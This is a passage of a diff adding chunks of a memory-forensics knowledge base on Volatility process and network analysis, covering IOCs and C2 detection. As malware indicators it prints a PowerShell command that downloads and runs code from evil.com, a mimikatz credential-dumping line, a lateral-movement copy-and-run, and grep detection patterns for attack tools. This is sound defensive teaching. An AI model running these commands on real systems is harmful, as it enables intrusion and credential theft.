+    }
+  },
+  {
+    "id": "03_process_analysis.md_38",
+    "content": "### Process Creation Hierarchy\n```\nSystem (PID 4)\n└── smss.exe (Session Manager)\n    └── csrss.exe (Client/Server Runtime)\n    └── wininit.exe\n        └── services.exe (Service Control Manager)\n            └── svchost.exe (multiple instances)\n            └── spoolsv.exe\n            └── ... (other services)\n    └── winlogon.exe\n        └── userinit.exe\n            └── explorer.exe (Windows Shell)\n                └── chrome.exe\n                └── notepad.exe\n                └── ... (user applications)\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Understanding Windows Processes",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_39",
+    "content": "**Key Insight**: Parent-child relationships are forensically significant. Suspicious examples:\n- `cmd.exe` parent of `powershell.exe` parent of `mimikatz.exe` (credential dumping)\n- `winword.exe` parent of `powershell.exe` (malicious macro)\n- `explorer.exe` parent of `svchost.exe` (unusual - svchost should be child of services.exe)",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Understanding Windows Processes",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_40",
+    "content": "### 1. windows.pslist\n**Purpose**: List all active processes (walks EPROCESS linked list)\n\n**Command:**\n```bash\nvol -f memory.dmp windows.pslist\n```\n\n**Output Columns:**\n- **PID**: Process ID\n- **PPID**: Parent Process ID (who created this process)\n- **ImageFileName**: Executable name\n- **Offset**: Virtual memory offset of EPROCESS structure\n- **Threads**: Number of threads\n- **Handles**: Number of open handles\n- **SessionId**: Session ID (0 = system, 1+ = user sessions)\n- **Wow64**: True if 32-bit process on 64-bit Windows\n- **CreateTime**: When process started\n- **ExitTime**: When process terminated (N/A if still running)",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_41",
+    "content": "**Example Output:**\n```\nPID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime                      ExitTime\n4       0       System          0x82341920      123     890     N/A             False   2024-01-15 10:30:00.000000      N/A\n412     4       smss.exe        0x85d7a8c0      2       30      N/A             False   2024-01-15 10:30:01.000000      N/A\n540     532     csrss.exe       0x86d2e920      12      500     0               False   2024-01-15 10:30:05.000000      N/A\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_42",
+    "content": "**What to Look For:**\n- ❌ Processes with PPID = 0 (orphaned - parent died)\n- ❌ Processes with suspicious names (e.g., svchost.exe with one 's' missing: svchosts.exe)\n- ❌ Processes in wrong directories (calc.exe in C:\\Temp instead of C:\\Windows\\System32)\n- ❌ Processes with unusual PPID (notepad.exe parent of cmd.exe - code injection?)\n\n**Use Cases:**\n- Quick triage: What was running on the system?\n- Timeline: When did malware start executing?\n- Baseline: Compare against known-good process list\n\n### 2. windows.pstree\n**Purpose**: Display process hierarchy (parent-child tree)\n\n**Command:**\n```bash\nvol -f memory.dmp windows.pstree\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_43",
+    "content": "**Output Format:**\n```\n* 4    0       System  2024-01-15 10:30:00.000000\n** 412 4       smss.exe        2024-01-15 10:30:01.000000\n*** 540        532     csrss.exe       2024-01-15 10:30:05.000000\n**** 1234      540     malware.exe     2024-01-15 14:25:30.000000  (SUSPICIOUS)\n```\n\n**Advantages over pslist:**\n- Visual hierarchy makes suspicious relationships obvious\n- Easier to spot process injection\n- Reveals malware persistence mechanisms\n\n**Example: Detecting Code Injection**\n```\nexplorer.exe (PID 1500)\n├── chrome.exe (PID 2000)  ← Normal\n├── notepad.exe (PID 2100)  ← Normal\n└── cmd.exe (PID 2200)  ← SUSPICIOUS (explorer shouldn't spawn cmd.exe)\n    └── powershell.exe (PID 2300)  ← VERY SUSPICIOUS\n        └── mimikatz.exe (PID 2400)  ← MALWARE\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_44",
+    "content": "### 3. windows.psscan\n**Purpose**: Scan physical memory for EPROCESS structures (finds hidden/unlinked processes)\n\n**Command:**\n```bash\nvol -f memory.dmp windows.psscan\n```\n\n**Why Needed:**\n- `pslist` walks the EPROCESS linked list (easy for rootkits to unlink)\n- `psscan` scans ALL memory for EPROCESS signatures (finds hidden processes)\n\n**Example: Finding Hidden Rootkit**\n```bash\n# pslist output (normal processes only)\nvol -f memory.dmp windows.pslist\n\n# psscan output (includes hidden process)\nvol -f memory.dmp windows.psscan | grep rootkit.exe\n```\n\n**Red Flags:**\n- Process in psscan but NOT in pslist (DKOM - Direct Kernel Object Manipulation)\n- Process with ExitTime in psscan but still running (hiding from process list)",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 4,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_45",
+    "content": "**Use Cases:**\n- Rootkit detection\n- Finding terminated processes (forensic timeline)\n- Detecting DKOM (Direct Kernel Object Manipulation)\n\n### 4. windows.cmdline\n**Purpose**: Extract command-line arguments for each process\n\n**Command:**\n```bash\nvol -f memory.dmp windows.cmdline\n```\n\n**Output Example:**\n```\nPID     Process                 Args\n1234    powershell.exe         C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64>\n5678    cmd.exe                cmd.exe /c whoami && net localgroup administrators\n```\n\n**Forensic Value:**\n- Reveals attacker commands (e.g., `net user`, `mimikatz`)\n- Shows lateral movement tools (e.g., `psexec`, `wmic`)\n- Exposes persistence mechanisms (e.g., scheduled tasks, registry modifications)",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 5,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_46",
+    "content": "**Malware Indicators:**\n```bash\n# Base64-encoded PowerShell (obfuscation)\npowershell.exe -EncodedCommand <base64_string>\n\n# Fileless malware (downloads and executes in memory)\npowershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"\n\n# Lateral movement (PsExec-style)\ncmd.exe /c copy \\\\victim\\C$\\Windows\\Temp\\malware.exe && \\\\victim\\C$\\Windows\\Temp\\malware.exe\n\n# Credential dumping (Mimikatz)\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n```\n\n**Use Cases:**\n- Incident response: What commands did the attacker run?\n- Malware analysis: How did malware spread?\n- Insider threat: What files did the employee access?\n\n### 5. windows.dlllist\n**Purpose**: List all DLLs loaded by each process",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 6,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_47",
+    "content": "**Command:**\n```bash\nvol -f memory.dmp windows.dlllist --pid <PID>\n```\n\n**Output Example:**\n```\nPID     Process                 Base    Size    Name                            Path\n1234    notepad.exe             0x00400000      0x6000      notepad.exe             C:\\Windows\\System32\\notepad.exe\n1234    notepad.exe             0x77320000      0x1af000    ntdll.dll               C:\\Windows\\System32\\ntdll.dll\n1234    notepad.exe             0x75e10000      0x1ab000    kernel32.dll            C:\\Windows\\System32\\kernel32.dll\n1234    notepad.exe             0x12340000      0x5000      evil.dll                C:\\Temp\\evil.dll  ← SUSPICIOUS\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 7,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_48",
+    "content": "**What to Look For:**\n- ❌ DLLs loaded from non-standard paths (C:\\Temp, C:\\Users\\Public)\n- ❌ DLLs with suspicious names (kernel33.dll instead of kernel32.dll)\n- ❌ DLLs not signed by Microsoft (verify with sigcheck)\n- ❌ DLLs injected into legitimate processes (e.g., evil.dll in notepad.exe)\n\n**Use Cases:**\n- DLL injection detection\n- Malware persistence (DLL hijacking)\n- API hooking detection\n\n### 6. windows.handles\n**Purpose**: List all open handles (files, registry keys, mutexes, events)\n\n**Command:**\n```bash\nvol -f memory.dmp windows.handles --pid <PID>\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 8,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_49",
+    "content": "**Output Example:**\n```\nPID     Process                 Offset          HandleValue     Type            Name\n1234    malware.exe             0x88ac7f10      0x4c            File            \\Device\\HarddiskVolume2\\Users\\victim\\passwords.txt\n1234    malware.exe             0x88ac8020      0x50            Mutant          Global\\MalwareMutex\n1234    malware.exe             0x88ac8130      0x54            Key             \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 9,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_50",
+    "content": "**Forensic Value:**\n- **Mutexes**: Malware uses mutexes to prevent multiple instances (mutex name often unique to malware family)\n- **File handles**: What files is malware reading/writing?\n- **Registry handles**: What registry keys is malware modifying (persistence)?\n- **Socket handles**: What network connections is malware maintaining?\n\n**Malware Mutex Examples:**\n```\nEmotet: Global\\I5O2V1D3\nWannaCry: Global\\MsWinZonesCacheCounterMutexA\nRyuk: Global\\{8761ABBD-7F85-42EE-B272-A76179687C63}\n```\n\n**Use Cases:**\n- Malware family identification (via mutex names)\n- Persistence mechanism detection (registry key handles)\n- Data exfiltration (file handle analysis)",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Core Process Analysis Plugins",
+      "chunk_index": 10,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_51",
+    "content": "### Technique 1: Process Hollowing Detection\n**What is Process Hollowing?**\nMalware creates a legitimate process (e.g., svchost.exe) in suspended state, hollows out its memory, injects malicious code, then resumes execution.\n\n**Detection with Volatility:**\n```bash\n# Step 1: Find suspicious processes\nvol -f memory.dmp windows.pslist | grep svchost.exe\n\n# Step 2: Check for code injection (malfind)\nvol -f memory.dmp windows.malfind --pid <svchost_PID>\n\n# Step 3: Dump process memory\nvol -f memory.dmp windows.memmap --pid <svchost_PID> --dump\n```\n\n**Red Flags:**\n- svchost.exe with unusual PPID (should be services.exe)\n- svchost.exe with PAGE_EXECUTE_READWRITE memory (suspicious)\n- svchost.exe with shellcode patterns in memory",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Advanced Process Analysis Techniques",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_52",
+    "content": "### Technique 2: PPID Spoofing Detection\n**What is PPID Spoofing?**\nAttacker creates process with fake parent process ID to blend in (e.g., making malware.exe appear to be child of services.exe)\n\n**Detection:**\n```bash\n# Step 1: Get process tree\nvol -f memory.dmp windows.pstree\n\n# Step 2: Verify PPID relationships\n# If malware.exe shows PPID = services.exe (PID 500)\n# But services.exe has no such child in tree → PPID spoofing\n```\n\n**Known Attack Tools:**\n- CobaltStrike: Uses PPID spoofing to evade detection\n- Metasploit: PPID spoofing via `migrate` command\n\n### Technique 3: Token Manipulation Detection\n**What is Token Manipulation?**\nAttacker steals security token from privileged process (e.g., SYSTEM) to escalate privileges",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Advanced Process Analysis Techniques",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_53",
+    "content": "**Detection:**\n```bash\n# Step 1: List processes with their tokens\nvol -f memory.dmp windows.privileges\n\n# Step 2: Look for suspicious token privileges\n# Example: notepad.exe with SeDebugPrivilege (should only be SYSTEM processes)\n```\n\n**Red Flags:**\n- User-mode process with SYSTEM token\n- Process with too many privileges (e.g., cmd.exe with SeDebugPrivilege)",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Advanced Process Analysis Techniques",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_54",
+    "content": "### Step 1: Initial Triage\n```bash\n# Get overview of running processes\nvol -f memory.dmp windows.pslist > pslist.txt\n\n# Count total processes\ncat pslist.txt | wc -l\n\n# Look for unusual process counts\n# Normal Windows 10: 80-120 processes\n# If 300+ processes: possible process injection or malware\n```\n\n### Step 2: Suspicious Process Identification\n```bash\n# Check for misspelled system processes\ncat pslist.txt | grep -i \"svch0st\\|lsas\\|csrs\"\n\n# Check for processes in wrong directories\nvol -f memory.dmp windows.cmdline | grep -v \"C:\\\\Windows\\\\System32\"\n\n# Check for hidden processes\nvol -f memory.dmp windows.psscan > psscan.txt\ndiff pslist.txt psscan.txt  # Processes in psscan but not pslist = hidden\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Process Forensics Workflow",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_55",
+    "content": "### Step 3: Process Tree Analysis\n```bash\n# Visualize parent-child relationships\nvol -f memory.dmp windows.pstree > pstree.txt\n\n# Look for unusual hierarchies\n# Example: explorer.exe → cmd.exe → powershell.exe → malware.exe\ngrep -A5 \"explorer.exe\" pstree.txt\n```\n\n### Step 4: Command-Line Analysis\n```bash\n# Extract all command lines\nvol -f memory.dmp windows.cmdline > cmdlines.txt\n\n# Search for malicious commands\ngrep -i \"mimikatz\\|psexec\\|net user\\|whoami\" cmdlines.txt\n\n# Search for encoded PowerShell\ngrep -i \"encodedcommand\" cmdlines.txt\n```\n\n### Step 5: DLL Injection Detection\n```bash\n# For each suspicious process, list DLLs\nvol -f memory.dmp windows.dlllist --pid <PID> > dlls_<PID>.txt\n\n# Check for DLLs in unusual locations\ngrep -v \"C:\\\\Windows\\\\System32\" dlls_<PID>.txt",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Process Forensics Workflow",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_56",
+    "content": "# Check for unsigned DLLs\n# (Requires manual verification with sigcheck or VirusTotal)\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Process Forensics Workflow",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_57",
+    "content": "### System Processes (Should ALWAYS be in C:\\Windows\\System32)\n- **System** (PID 4) - Kernel process, PPID 0\n- **smss.exe** - Session Manager, PPID 4\n- **csrss.exe** - Client/Server Runtime, PPID smss.exe\n- **wininit.exe** - Windows Initialization, PPID smss.exe\n- **services.exe** - Service Control Manager, PPID wininit.exe\n- **svchost.exe** - Service Host, PPID services.exe\n- **lsass.exe** - Local Security Authority, PPID wininit.exe\n- **winlogon.exe** - Windows Logon, PPID smss.exe\n- **explorer.exe** - Windows Shell, PPID userinit.exe",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Common Process-Related IOCs (Indicators of Compromise)",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_58",
+    "content": "### Suspicious Process Behaviors\n```\n❌ svchost.exe NOT child of services.exe (process hollowing or impersonation)\n❌ csrss.exe NOT in C:\\Windows\\System32 (malware disguise)\n❌ lsass.exe with unusual command-line arguments (credential dumping)\n❌ powershell.exe with -EncodedCommand (obfuscated malware)\n❌ cmd.exe spawned by Microsoft Office apps (malicious macros)\n❌ Any .exe in C:\\Users\\AppData\\Local\\Temp (common malware staging area)\n```",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Common Process-Related IOCs (Indicators of Compromise)",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_59",
+    "content": "1. **pslist** = Quick overview of running processes\n2. **pstree** = Visualize parent-child relationships (detect code injection)\n3. **psscan** = Find hidden processes (rootkit detection)\n4. **cmdline** = See what commands were executed\n5. **dlllist** = Detect DLL injection\n6. **handles** = Find malware mutexes and persistence mechanisms\n\n**Golden Rule**: Verify PPID, path, command-line, and digital signature for every suspicious process.",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "Key Takeaways",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "03_process_analysis.md_60",
+    "content": "- **Module 04**: Network analysis and malware C2 detection\n- **Module 05**: Advanced malware detection with Malfind\n- **Module 06**: Registry forensics and persistence mechanisms\n\n---\n\n**Reference**: \"The Art of Memory Forensics\" by Michael Hale Ligh et al. (2014)",
+    "metadata": {
+      "filename": "03_process_analysis.md",
+      "document_title": "Process Analysis with Volatility",
+      "section": "What's Next?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_61",
+    "content": "**Traditional network forensics limitations:**\n- Requires packet capture (may not exist)\n- Encrypted traffic (HTTPS, VPN) hides C2 communication\n- Ephemeral connections (may be closed before packet capture)\n\n**Memory forensics advantages:**\n- **Active connections**: See what's connected RIGHT NOW\n- **Listening ports**: Find backdoors waiting for connections\n- **Process-to-connection mapping**: Which process owns which connection?\n- **Historical connections**: Closed connections may still be in memory",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Why Network Forensics in Memory?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_62",
+    "content": "### windows.netscan\n**Purpose**: Scan memory for TCP/UDP connections and listening sockets\n\n**Command:**\n```bash\nvol -f memory.dmp windows.netscan\n```\n\n**Output Columns:**\n- **Offset**: Memory offset of network structure\n- **Proto**: Protocol (TCPv4, UDPv4, TCPv6, UDPv6)\n- **LocalAddr**: Local IP address\n- **LocalPort**: Local port number\n- **ForeignAddr**: Remote IP address\n- **ForeignPort**: Remote port number\n- **State**: Connection state (ESTABLISHED, LISTENING, CLOSED, etc.)\n- **PID**: Process ID owning the connection\n- **Owner**: Process name\n- **Created**: Timestamp when connection was created",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Core Network Analysis Plugins",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_63",
+    "content": "**Example Output:**\n```\nOffset          Proto   LocalAddr:LocalPort     ForeignAddr:ForeignPort State           PID     Owner           Created\n0x12ab89c0      TCPv4   192.168.1.100:49152     93.184.216.34:443       ESTABLISHED     1234    chrome.exe      2024-01-18 10:30:00\n0x12ab8a10      TCPv4   0.0.0.0:445             0.0.0.0:0               LISTENING       4       System          2024-01-18 09:00:00\n0x12ab8b20      TCPv4   192.168.1.100:4444      10.0.0.50:55123         ESTABLISHED     5678    cmd.exe         2024-01-18 14:25:30\n```",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Core Network Analysis Plugins",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_64",
+    "content": "**Red Flags:**\n- ❌ **Unusual external IPs**: Connections to countries/IPs not typical for the organization\n- ❌ **High-numbered ports**: 4444, 31337, 8080, 12345 (common C2 ports)\n- ❌ **Unusual process-to-port mapping**: notepad.exe with network connection, calc.exe listening on port 4444\n- ❌ **0.0.0.0 listeners**: Processes listening on all interfaces (potential backdoor)\n- ❌ **Connections from system processes**: svchost.exe, lsass.exe, smss.exe should NOT have external connections\n\n### Understanding Connection States\n\n**LISTENING**: Port is open, waiting for incoming connections\n- **Normal**: Web server on port 80/443, SSH server on port 22\n- **Suspicious**: Port 4444 (Metasploit), port 31337 (Back Orifice), port 12345 (NetBus)",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Core Network Analysis Plugins",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_65",
+    "content": "**ESTABLISHED**: Active connection between two hosts\n- **Normal**: Chrome.exe connecting to google.com:443\n- **Suspicious**: cmd.exe connecting to attacker IP on port 4444\n\n**CLOSE_WAIT**: Connection in process of closing\n- **Forensic Value**: May indicate recently terminated C2 connection\n\n**TIME_WAIT**: Connection closed, waiting for final packets\n- **Forensic Value**: Shows historical connections (timeline reconstruction)",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Core Network Analysis Plugins",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_66",
+    "content": "### Step 1: Identify All External Connections\n```bash\n# Extract all network connections\nvol -f memory.dmp windows.netscan > netscan.txt\n\n# Filter for ESTABLISHED connections to external IPs\ncat netscan.txt | grep ESTABLISHED | grep -v \"127.0.0.1\\|192.168\\|10.0\\|172.16\"\n\n# Result: List of active connections to internet\n```\n\n**Analysis Questions:**\n1. Is the remote IP legitimate? (Check VirusTotal, AbuseIPDB, Shodan)\n2. Is the process expected to have network connections? (chrome.exe = yes, notepad.exe = no)\n3. Is the port number suspicious? (443 = normal HTTPS, 4444 = Metasploit default)\n4. When was the connection created? (timeline correlation with other events)\n\n### Step 2: Identify Listening Ports (Backdoors)\n```bash\n# Find all LISTENING ports\ncat netscan.txt | grep LISTENING",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Network Forensics Workflow",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_67",
+    "content": "# Focus on high-numbered ports (>1024)\ncat netscan.txt | grep LISTENING | awk '$3 ~ /:([5-9][0-9]{3}|[1-9][0-9]{4,})$/'\n```\n\n**Common Backdoor Ports:**\n```\nPort 31337: Back Orifice (classic backdoor)\nPort 4444: Metasploit default listener\nPort 5555: Android Debug Bridge (adb) - if not expected\nPort 8080: HTTP alternate (often used for C2 proxying)\nPort 12345: NetBus backdoor\nPort 27374: SubSeven backdoor\nPort 1337: Elite ports (often used by script kiddies)\n```\n\n### Step 3: Process-to-Connection Mapping\n```bash\n# For each suspicious connection, identify the process\n# Example: Connection to 10.0.0.50:4444 from cmd.exe (PID 5678)\n\n# Get command-line for that process\nvol -f memory.dmp windows.cmdline --pid 5678\n\n# Get DLLs loaded by that process\nvol -f memory.dmp windows.dlllist --pid 5678",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Network Forensics Workflow",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_68",
+    "content": "# Check for code injection\nvol -f memory.dmp windows.malfind --pid 5678\n```\n\n### Step 4: Timeline Reconstruction\n```bash\n# Extract timestamps from network connections\ncat netscan.txt | awk '{print $NF, $0}' | sort\n\n# Correlate with process creation times\nvol -f memory.dmp windows.pslist | awk '{print $NF, $0}' | sort\n\n# Result: Timeline of when malware was executed and when C2 connection was established\n```",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Network Forensics Workflow",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_69",
+    "content": "### C2 Communication Patterns\n\n**Pattern 1: Beaconing (Periodic Check-Ins)**\n```\nMalware connects to C2 server every X seconds/minutes\nExample: Connection to 93.184.216.34:443 every 60 seconds\n\nDetection:\n- Look for multiple connections to same IP with regular intervals\n- Check process command-line for sleep/delay parameters\n```\n\n**Pattern 2: DNS Tunneling**\n```\nMalware encodes data in DNS queries (bypasses firewalls)\nExample: a1b2c3d4.malware.evil.com\n\nDetection:\n- Unusually long DNS queries (>50 characters)\n- High volume of DNS queries to same domain\n- Subdomains with hex/base64-looking strings\n```\n\n**Pattern 3: HTTP/HTTPS C2**\n```\nMalware uses legitimate-looking HTTP(S) traffic\nExample: POST requests to attacker-controlled server",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Malware C2 (Command and Control) Detection",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_70",
+    "content": "Detection:\n- Unusual User-Agent strings\n- Connections to recently registered domains\n- HTTP traffic from non-browser processes\n```\n\n**Pattern 4: Reverse HTTPS (HTTPS over non-443 ports)**\n```\nMalware uses HTTPS on unusual ports to evade detection\nExample: TCP connection to 8.8.8.8:8443 (not standard HTTPS port)\n\nDetection:\n- HTTPS traffic on ports other than 443\n- Connections to cloud services from system processes\n```\n\n### Known C2 Frameworks (Signatures)\n\n**Cobalt Strike:**\n```\n- Default port: 50050 (HTTPS), 80 (HTTP), 443 (HTTPS)\n- User-Agent: Often customizable, but defaults to \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\"\n- Beacon behavior: Regular check-ins (beaconing)\n- Process: Often injected into legitimate processes (rundll32.exe, svchost.exe)\n```",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Malware C2 (Command and Control) Detection",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_71",
+    "content": "**Metasploit:**\n```\n- Default port: 4444 (reverse TCP), 4445 (bind TCP)\n- User-Agent: \"Mozilla/5.0\"\n- Meterpreter process: Often creates background process with random name\n```\n\n**Empire:**\n```\n- Default port: 80 (HTTP), 443 (HTTPS)\n- User-Agent: PowerShell-based, often customizable\n- Process: powershell.exe with encoded command-line\n```\n\n**PoshC2:**\n```\n- Default port: 443 (HTTPS)\n- User-Agent: Randomized\n- Process: powershell.exe or rundll32.exe\n```",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Malware C2 (Command and Control) Detection",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_72",
+    "content": "### Suspicious Process-Port Combinations\n```\n❌ notepad.exe with ANY network connection (not expected)\n❌ calc.exe listening on ANY port (definitely backdoor)\n❌ cmd.exe with external connection on port 4444 (Metasploit reverse shell)\n❌ powershell.exe with connection to IP on port 443 (Empire/PoshC2)\n❌ svchost.exe with connection to external IP (should only connect to Microsoft services)\n❌ lsass.exe with network connection (credential dumping/exfiltration)\n```\n\n### Suspicious IP Addresses\n```\nCheck these resources for IP reputation:\n- VirusTotal: https://www.virustotal.com/\n- AbuseIPDB: https://www.abuseipdb.com/\n- Shodan: https://www.shodan.io/\n- ThreatCrowd: https://www.threatcrowd.org/",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Network IOCs (Indicators of Compromise)",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_73",
+    "content": "Red flags:\n- IPs from Tor exit nodes\n- IPs from known VPS providers (DigitalOcean, Linode, Vultr) - common for C2\n- IPs from countries with no business relationship\n- IPs with open ports 22, 4444, 8080 (Shodan scan)\n```\n\n### Suspicious Ports\n```\nCommon C2 Ports:\n- 4444: Metasploit default\n- 5555: Android ADB (if not expected)\n- 6666-7777: IRC botnets\n- 8080: HTTP alternate (C2 proxy)\n- 8443: HTTPS alternate\n- 9001-9030: Tor network\n- 12345: NetBus\n- 27374: SubSeven\n- 31337: Back Orifice\n```",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Network IOCs (Indicators of Compromise)",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_74",
